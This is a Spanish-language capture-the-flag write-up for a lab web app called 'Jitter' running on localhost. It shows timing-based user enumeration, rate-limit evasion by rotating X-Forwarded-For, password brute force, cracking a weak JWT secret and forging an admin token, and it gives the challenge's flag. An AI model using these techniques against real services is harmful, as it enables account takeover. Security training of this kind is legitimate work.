# Writeup: Jitter CTF

## Flujo de Ataque

1. **Enumeración de Usuarios**: Login para identificar correos válidos.
2. **Bypass de Rate Limit**: Uso de la cabecera `X-Forwarded-For` para evitar el bloqueo de 15 req/min.
3. **Fuerza Bruta**: Crackeo de la contraseña de un usuario.
4. **Escalada de Privilegios**: Fuerza bruta al secreto del JWT y falsificación de token de administrador.

---

### Requisitos y Herramientas

- Burp Suite, Nmap.
- [Ruby](https://www.ruby-lang.org/es/documentation/installation/#apt) (Necesario para los scripts).
- Scripts: `time_bypass.rb`, `pass_brute.rb`, `jwt_breaker.rb`, `jwt_breaker.rb`.
- Wordlists: `rockyou.txt`

---

## Reconocimiento y Enumeración

### Escaneo de Puertos

Empezamos con un escaneo básico para identificar servicios:

```sh
$ nmap -sV -sC -p- --open -Pn 127.0.0.1
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-31 18:04 -0300
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00s latency).

PORT     STATE SERVICE
3000/tcp open  ppp

```

### Canal Lateral

El sistema implementa un Rate Limiter estricto (15 req/min), pero confía ciegamente en la cabecera X-Forwarded-For. Al analizar las peticiones al endpoint POST `/api/login`, notamos una discrepancia en el tiempo de respuesta dependiendo de si el usuario existe o no.

Utilizamos `time_bypass.rb` para automatizar la búsqueda:

```bash
ruby time_bypass.rb http://127.0.0.1:3000/api/login rockyou.txt

[*] Escaneando
[-] dj77836@jitter.io              | 200 OK         | 218.5    ms | IP: 246.192.16.218
[-] 521407@jitter.io               | 200 OK         | 217.2    ms | IP: 199.119.194.227
[+] 1tommyboy@jitter.io            | 200 OK         | 250.07   ms | IP: 179.178.61.174
[-] summerjf1@jitter.io            | 200 OK         | 218.99   ms | IP: 23.21.149.8
[+] okione01@jitter.io             | 200 OK         | 247.12   ms | IP: 182.145.92.76
[-] hanyabbu@jitter.io             | 200 OK         | 216.02   ms | IP: 129.63.4.164
```

---

## Acceso Inicial

Con los correos válidos, usamos `pass_brute.rb` para probar contraseñas contra el usuario encontrado rotando IPs en cada petición para evadir el Rate Limit.

```bash
ruby pass_brute.rb http://127.0.0.1:3000/api/login 1tommyboy@jitter.io wordlist.txt

[*] Brute Force password 1tommyboy@jitter.io
[-] 1tommyboy@jitter.io       | FAILED  | Pass: 52102999        | Status: 200 | IP: 211.22.81.78
[-] 1tommyboy@jitter.io       | FAILED  | Pass: amirude?        | Status: 200 | IP: 217.243.195.177
[-] 1tommyboy@jitter.io       | FAILED  | Pass: 521407          | Status: 200 | IP: 146.225.43.92
[-] 1tommyboy@jitter.io       | FAILED  | Pass: 1tommyboy       | Status: 200 | IP: 212.81.233.94
[+] 1tommyboy@jitter.io       | SUCCESS | Pass: summerjf1       | Status: 302 | IP: 52.60.115.93
```

---

## Escalada de Privilegios

Una vez dentro del panel, recibimos una cookie `token` que es un JWT. Al analizarlo en `jwt.io`, vemos que el payload contiene:

```json
{
  "email": "1tommyboy@jitter.io",
  "role": "user",
  "iat": 1769895344
}
```

El secreto de firma es débil. Utilizamos `jwt_breaker.rb` para crackear la firma:

```bash
ruby jwt_breaker.rb "TOKEN_ORIGINAL" rockyou.txt

[*] Brute Force JWT
[-] FAILED  | Secret: sskg12               | Invalid Signature
[-] FAILED  | Secret: taradademierda       | Invalid Signature
[+] SUCCESS | Secret: ontock               | JWT Validated!
```

### Forjando el Token de Admin

Utilizamos el secreto `ontock` para generar un nuevo token con privilegios elevados. Modificamos el payload para suplantar a un administrador:

```json
{
  "email": "m.valencia_sys88@jitter.io",
  "role": "admin",
  "iat": 1738342400
}
```

### Ejecutamos el script para nuevo token:

Sabiendo la forma de el token generamos uno nuevo, usamos `jwt_forger.rb`

```bash
ruby jwt_forger.rb "TOKEN_ORIGINAL" "ontock"

[+] TOKEN FORJADO:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6Im0udmFsZW5jaWFf..............
```

Al enviar este nuevo token en la cookie, obtenemos acceso al panel de administración (o actualizar la pagina con token nuevo) para obtener la flag final.

**Flag:** `JITTER{T1M3_4ND_M3MORY_GH0ST5}`
